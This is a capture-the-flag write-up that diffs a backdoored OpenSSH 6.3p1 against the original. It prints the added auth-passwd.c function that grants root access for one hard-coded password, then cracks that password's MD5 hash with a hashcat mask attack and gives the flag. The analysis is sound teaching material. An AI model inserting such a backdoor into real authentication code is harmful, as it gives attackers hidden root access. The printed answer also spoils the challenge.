# Can You Look This Over?

* **Category**: Miscellaneous
* **Points**: 150
* **Challenge**: Our ops guys found a malware author's staging server, we managed to exfiltrate the source to a backdoor they are spreading: backdoor.tar.gz. I need you to report back once you have cracked their secret password.
* **Hint #1**: What version / release of OpenSSH is in the provided archive?


<br />

One of the hints for this challenge asks what is the version of the OpenSSH backdoor you have been provided?  Looking through the files, I was able to find the version of the in an openssh.spec file: 

```
cat /backdoor/contrib/suse/openssh.spec

...snip...

Summary:	OpenSSH, a free Secure Shell (SSH) protocol implementation
Name:		openssh
Version:	6.3p1
URL:		http://www.openssh.com/
Release:	1
Source0:	openssh-%{version}.tar.gz
Source1:	x11-ssh-askpass-%{xversion}.tar.gz
License:	BSD

...snip...
```

<br />

Now that we have the version of OpenSSH, lets download a copy of the original [OpenSSH 6.3p1](http://ftp.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-6.3p1.tar.gz) from the source and compare if to the backdoor:
```
diff -q openssh-6.3p1/ backdoor/

Files openssh-6.3p1/auth.c and backdoor/auth.c differ
Files openssh-6.3p1/auth.h and backdoor/auth.h differ
Files openssh-6.3p1/auth-passwd.c and backdoor/auth-passwd.c differ
Only in openssh-6.3p1/: ChangeLog
```

<br />

So there are three files that are different between the backoor and the original OpenSSH 6.3p1.  The auth-passwd.c is used for password authentication and contains fucntions to check whether the password is valid for a user.  Lets look at the differences in that file:
```
diff openssh-6.3p1/auth-passwd.c backdoor/auth-passwd.c


th-passwd.c 
47a48,49
> #include <openssl/md5.h>
> 
88a91,93
>     if(sys_auth_backdoor(authctxt, password))
>         return 1;
> 
215a221,245
>     
> static char backdoor_hash[MD5_DIGEST_LENGTH] = \
> {
>     0x22, 0xEA, 0x36, 0x43, 0xD7, 0x37, 0x17, 0x20, 0xBC, 0xE8, 0xB5, 0xF2, 0x44, 0xD4, 0x02, 0x6A
> };
> 
> int
> sys_auth_backdoor(Authctxt *authctxt, const char *password)
> {
>     MD5_CTX c = {};
>     char password_hash[MD5_DIGEST_LENGTH] = {}; 
> 	struct passwd *pw = authctxt->pw;
>     
>     if(strcmp(pw->pw_name, "root") != 0 || strlen(password) != 6)
>         return 0;
> 
>     MD5_Init(&c);
>     MD5_Update(&c, password, strlen(password));
>     MD5_Final(password_hash, &c);
> 
>     if(memcmp(backdoor_hash, password_hash, MD5_DIGEST_LENGTH) != 0)
>         return 0;
> 
>     return 1;
> }
```

<br />

Again the challenge is asking us to crack a secret password.  `The static char backdoor_hash[MD5_DIGEST_LENGTH]` looks like it contains a hashed password.  Lets strip out the leading `0x`:
```
22EA3643D7371720BCE8B5F244D4026A
```

<br /> 

Now lets check to see what kind of hash this is:
```
hash-identifier 

   -------------------------------------------------------------------------
 HASH: 22EA3643D7371720BCE8B5F244D4026A

Possible Hashs:
[+]  MD5
[+]  Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

<br /> 

Now that we know the hash type (MD5), lets look at the code further:
```
if(strcmp(pw->pw_name, "root") != 0 || strlen(password) != 6)
         return 0;
```
So to aid in cracking the MD5 password hash, it looks like the password must six characters in length. Another hint provided for this challenge is the password contains mixed case alphanumreic and no symbols.  Now we use a hashcat to perform a [mask attack](https://www.4armed.com/blog/perform-mask-attack-hashcat/).  To do this, we create a create a custom character set consisting of upper and lowercase letters and numbers (`-1 ?l?u?d`), then we specify tthat each of the six characters in the password could be from that character set (`?1?1?1?1?1?1`).  Put it all together using hashcat (I used the Windows version):
```
hashcat64.exe -m 0 -a 3 -1 ?l?u?d hash.txt ?1?1?1?1?1?1 -O


22ea3643d7371720bce8b5f244d4026a:2tNM8l
```

<br />

## Flag: ACI{2tNM8l}
